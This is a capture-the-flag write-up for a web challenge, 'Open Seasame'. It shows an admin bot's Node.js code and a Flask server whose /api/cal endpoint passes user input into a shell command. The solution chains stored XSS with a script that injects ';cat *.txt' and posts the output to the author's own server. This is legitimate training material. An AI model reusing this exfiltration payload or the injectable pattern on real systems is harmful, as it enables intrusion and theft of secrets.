### Challenge ###
Open Seasame
170
Easy
Does the CLI listen to magic?

http://chal.competitivecyber.club:13336

Flag format: CACI{.*}

Author: CACI

### Solution ###

We are given to files one is used i  the server we are given and the other is used in a server which was hidden from us.

Code of the server given to us admin.js:
```nodejs
const express = require("express");
const puppeteer = require("puppeteer");
const escape = require("escape-html");
const fs = require("fs");

const app = express();
app.use(express.urlencoded({ extended: true }));

const SECRET = fs.readFileSync("secret.txt", "utf8").trim();
const CHAL_URL = "http://127.0.0.1:1337/";

const visitUrl = async (url) => {
  let browser = await puppeteer.launch({
    headless: "new",
    pipe: true,
    dumpio: true,

    args: [
      "--no-sandbox",
      "--disable-gpu",
      "--disable-software-rasterizer",
      "--disable-dev-shm-usage",
      "--disable-setuid-sandbox",
      "--js-flags=--noexpose_wasm,--jitless",
    ],
  });

  try {
    const page = await browser.newPage();

    try {
      await page.setUserAgent("puppeteer");
      let cookies = [
        {
          name: "secret",
          value: SECRET,
          domain: "127.0.0.1",
          httpOnly: true,
        },
      ];
      await page.setCookie(...cookies);
      await page.goto(url, { timeout: 5000, waitUntil: "networkidle2" });
    } finally {
      await page.close();
    }
  } finally {
    browser.close();
    return;
  }
};

app.get("/", async (req, res) => {
  const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Bot</title>
        <style>
            body {
                background-color: #121212;
                color: #e0e0e0;
                font-family: 'Arial', sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .container {
                max-width: 600px;
                width: 100%;
                text-align: center;
                padding: 20px;
                background-color: #1e1e1e;
                border-radius: 8px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            }
            h1 {
                font-size: 32px;
                margin-bottom: 20px;
                color: #ff9800;
            }
            #path_box {
                display: flex;
                align-items: center;
                width: 100%;
                padding: 10px;
                margin-bottom: 20px;
                border-radius: 5px;
                background-color: #333;
            }
            #path_box div {
                color: #ff9800;
                margin-right: 10px;
            }
            input {
                flex-grow: 1;
                font-size: 16px;
                padding: 8px;
                border: none;
                border-radius: 4px;
                background-color: #555;
                color: #e0e0e0;
            }
            button {
                background-color: #ff9800;
                color: #1e1e1e;
                padding: 10px 20px;
                border: none;
                border-radius: 5px;
                font-size: 18px;
                cursor: pointer;
                transition: background-color 0.3s;
            }
            button:hover {
                background-color: #e68900;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Have the Admin Bot Visit a Page</h1>
            <div id="path_box">
                <div>http://127.0.0.1:1337/</div>
                <input type="text" id="path" name="path" placeholder="Enter the path">
            </div>
            <button onclick="go()">Go</button>
        </div>
        <script>
            async function go() {
                const button = document.querySelector('button');
                button.disabled = true;
                button.textContent = "Visiting page...";
                const path = document.getElementById('path').value;
                try {
                    const response = await fetch('/visit', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        },
                        body: 'path=' + encodeURIComponent(path)
                    });
                    const text = await response.text();
                    alert(text);
                } catch (error) {
                    alert('An error occurred: ' + error.message);
                } finally {
                    button.textContent = "Go";
                    button.disabled = false;
                }
            }
        </script>
    </body>
    </html>`;
  res.send(html);
});

app.post("/visit", async (req, res) => {
  const path = req.body.path;
  console.log("received path: ", path);

  let url = CHAL_URL + path;

  if (url.includes("cal") || url.includes("%")) {
    res.send('Error: "cal" is not allowed in the URL');
    return;
  }

  try {
    console.log("visiting url: ", url);
    await visitUrl(url);
  } catch (e) {
    console.log("error visiting: ", url, ", ", e.message);
    res.send("Error visiting page: " + escape(e.message));
  } finally {
    console.log("done visiting url: ", url);
    res.send("Visited page.");
  }
});

const port = 1336;
app.listen(port, async () => {
  console.log(`Listening on ${port}`);
});
```

The code is quite simple here it creates a bot which visits to http://127.0.0.1:1337/ and we can control the endpoint.

Code of the server hidden to us server.py:
```python
from flask import Flask, request
import uuid, subprocess

app = Flask(__name__)
SECRET = open("secret.txt", "r").read()
stats = []

@app.route('/', methods=['GET'])
def main():
    return 'Hello, World!'

@app.route('/api/stats/<string:id>', methods=['GET'])
def get_stats(id):
    for stat in stats:
        if stat['id'] == id:
            return str(stat['data'])
        
    return '{"error": "Not found"}'

@app.route('/api/stats', methods=['POST'])
def add_stats():
    try:
        username = request.json['username']
        high_score = int(request.json['high_score'])
    except:
        return '{"error": "Invalid request"}'
    
    id = str(uuid.uuid4())

    stats.append({
        'id': id,
        'data': [username, high_score]
    })
    return '{"success": "Added", "id": "'+id+'"}'

@app.route('/api/cal', methods=['GET'])
def get_cal():
    cookie = request.cookies.get('secret')

    if cookie == None:
        return '{"error": "Unauthorized"}'
    
    if cookie != SECRET:
        return '{"error": "Unauthorized"}'
    
    modifier = request.args.get('modifier','')
    
    return '{"cal": "'+subprocess.getoutput("cal "+modifier)+'"}'


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337, threaded=True)
```
After noticing the port of this server we can say that the bot visits this server and we can control the endpoint.

The /api/cal endpoint is interesting it take input from get parameter modifier and passes it to subprocess.getoutput which run command on the server. This is vulnerable to command injection but we can't access it because we don't have access to SECRET which is required to authenticate but the bot has it so we can use the bot to send the request.

The bot also has a check that blocks us from accessing /api/cal the bot checks if cal is present in the endpoint if it is it will not visit the url.
Next I tried to find the hidden server it was also public but kept hidden to us.
hidden server: http://chal.competitivecyber.club:13337/
known server: http://chal.competitivecyber.club:13336/

We are also given 2 endpoints in hidden that we can use to add and read data on tge server after seeing this i thought of xss.
We can store our xss payload in the hidden and make the bot visit the endpoint to read the xss payload.

My xss payload:
```
curl -v http://chal.competitivecyber.club:13337/api/stats -H "Content-Type: application/json" --data @payload /

payload file : {"username":"<script src=http://my-server/payload.js></script>","high_score":"10"}
```
I used this payload to make is easier for me to change the payload again and again.
The actual payload is in payload.js:
```
const fetchEndpoint = '/api/cal?modifier=;cat *.txt';
const reportEndpoint = 'http://my-server/report';
  fetch(fetchEndpoint)
  .then(res => res.text())
  .then(data => fetch(reportEndpoint, {
    method: 'POST',
    headers: { 'Content-Type': 'text/plain' },
    body: data
  }))
  .catch(error => fetch(reportEndpoint, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ error: error.message })
   }));
```
This fetch /api/cal?modifier=;cat *.txt and sends it to your server. This expoits the command injection vulnerability.

